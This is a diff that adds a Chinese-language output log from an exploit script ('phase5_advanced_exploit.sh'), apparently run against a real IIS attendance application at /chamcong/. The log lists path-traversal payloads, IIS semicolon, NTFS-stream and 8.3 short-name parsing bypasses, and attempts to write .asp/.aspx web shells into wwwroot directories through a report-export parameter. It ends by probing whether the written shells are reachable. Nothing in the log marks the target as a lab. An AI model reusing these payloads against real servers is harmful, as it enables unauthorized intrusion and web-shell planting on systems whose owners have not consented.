@@ -1,0 +1,126 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔥 Phase 5: 高级利用 + 文件解析绕过
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] IIS文件解析漏洞测试
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+IIS 6.0: /shell.asp;.xls → 当作.asp执行
+IIS 7.0+: /shell.asp:.xls → NTFS流
+
+
+  [1/6] ../../../inetpub/wwwroot/chamcong/test.asp; | .jpg
+    路径: C:\inetpub\wwwroot\chamcong\test.asp;.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.asp;.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.asp;.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [2/6] ../../../inetpub/wwwroot/chamcong/test.asp:: | .jpg
+
+  [3/6] ../../../inetpub/wwwroot/chamcong/test.aspx; | .jpg
+    路径: C:\inetpub\wwwroot\chamcong\test.aspx;.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.aspx;.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.aspx;.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [4/6] ../../../inetpub/wwwroot/chamcong/test.aspx:: | .jpg
+
+  [5/6] ../../../inetpub/wwwroot/chamcong/test.asp/ | a.jpg
+    路径: C:\inetpub\wwwroot\chamcong\test.asp\a.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.asp\a.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.asp\a.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [6/6] ../../../inetpub/wwwroot/chamcong/test.aspx/ | a.jpg
+    路径: C:\inetpub\wwwroot\chamcong\test.aspx\a.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.aspx\a.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test.aspx\a.jpg_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[2] 尝试写入到现有目录
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+已知存在的目录: /chamcong/, /chamcong/report/
+
+
+  [1/5] ../../../inetpub/wwwroot/chamcong/report/x | .aspx
+    路径: C:\inetpub\wwwroot\chamcong\report\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\report\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\report\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [2/5] ../../../inetpub/wwwroot/chamcong/x | .aspx
+    路径: C:\inetpub\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [3/5] ../../../inetpub/wwwroot/x | .aspx
+    大小: 2750 bytes
+
+  [4/5] ../../../../wwwroot/chamcong/x | .aspx
+    路径: C:\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\wwwroot\chamcong\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [5/5] ../../../../wwwroot/x | .aspx
+    路径: C:\wwwroot\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\wwwroot\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\wwwroot\x.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[3] 短文件名 (8.3格式)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Windows短文件名: SHELL~1.ASP
+
+
+  [1/3] ../../../inetpub/wwwroot/chamcong/shell~1 | .asp
+    路径: C:\inetpub\wwwroot\chamcong\shell~1.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell~1.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\shell~1.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [2/3] ../../../inetpub/wwwroot/chamcong/x~1 | .asp
+    路径: C:\inetpub\wwwroot\chamcong\x~1.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\x~1.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\x~1.asp_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+  [3/3] ../../../inetpub/wwwroot/chamcong/test~1 | .aspx
+    路径: C:\inetpub\wwwroot\chamcong\test~1.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test~1.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+C:\inetpub\wwwroot\chamcong\test~1.aspx_BC01_KVMB_KVMBTCVP &nbsp;_BC_DT.xls
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[4] 测试所有其他参数组合
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+尝试控制文件内容：通过报表数据
+
+  测试带有特殊ListDV/ListBP参数...
+    大小: 8271 bytes
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[5] 测试不同的BC报表（可能权限不同）
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试 BC01 + 路径遍历...
+
+  测试 BC02 + 路径遍历...
+
+  测试 BC03 + 路径遍历...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[6] 终极测试：尝试访问已写入的文件
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  测试: /chamcong/shell.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls: phase5_advanced_exploit.sh: line 223: test_access_87886ed7618abc47235afab015c3c724.html: No such file or directory
+000 ( bytes)
+  测试: /chamcong/shell2025_BC01_KVMB_KVMBTCVP  _BC_DT.xls: phase5_advanced_exploit.sh: line 223: test_access_6e879c9c2739e34283adbf69262d5787.html: No such file or directory
+000 ( bytes)
+  测试: /chamcong/x.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls: phase5_advanced_exploit.sh: line 223: test_access_50387cab94150a34b0dc3aa95c781051.html: No such file or directory
+000 ( bytes)
+  测试: /shell.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls: phase5_advanced_exploit.sh: line 223: test_access_9111efb6bf6ed744aafbd3df04a2091f.html: No such file or directory
+000 ( bytes)
+  测试: /chamcong/report/x.aspx_BC01_KVMB_KVMBTCVP  _BC_DT.xls: phase5_advanced_exploit.sh: line 223: test_access_649b99445b48f5eec18371890a460c67.html: No such file or directory
+000 ( bytes)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ Phase 5 完成
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 关键测试:
+  - IIS解析漏洞
+  - 现有目录写入
+  - 短文件名
+  - 不同BC报表
+  - 文件访问验证
